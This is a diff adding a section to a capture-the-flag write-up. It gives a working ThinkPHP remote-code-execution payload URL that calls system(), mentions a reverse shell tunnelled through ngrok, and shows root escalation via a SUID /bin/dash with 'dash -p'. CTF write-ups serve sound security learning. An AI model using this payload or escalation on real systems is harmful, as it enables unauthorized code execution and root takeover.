@@ -1010,4 +1010,36 @@ In any case we have the flag
 Flag: battleCTF{ret2CLI@dlresolve_a22c24101f31bb15ea7ac818364c980c3fd8ab0a9ed99f023a5c6910a30ee52d}
 ```
 
+**Hmmmm!..**
+
+For this challenge it was a CVE based on Think PHP
+
+Here's the payload used:
+
+```
+http://chall.bugpwn.com:8083/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+```
+
+From this i got a reverse shell 
+
+As i don't own a vps i tunnelled my local host listener via ngrok 
+
+The privilege escalation was simple
+
+It was an suid binary: /bin/dash
+
+As `/bin/sh` is a symlink to `/bin/dash` this means we can drop a root shell via doing `dash -p`
+
+The flag was located in `/root`
+
+```
+Flag: battleCTF{Small_B0$$_89ca16c29e5a5466af646f14f5fcde6d}
+```
+
+And this ends my writeup, hope you had fun reading (if you read all or not)
+
+Thanks!
+
+I played as user `0x1337`
+![image](https://github.com/user-attachments/assets/7ad930cc-9364-4778-b453-e54e306eb5fb)
 
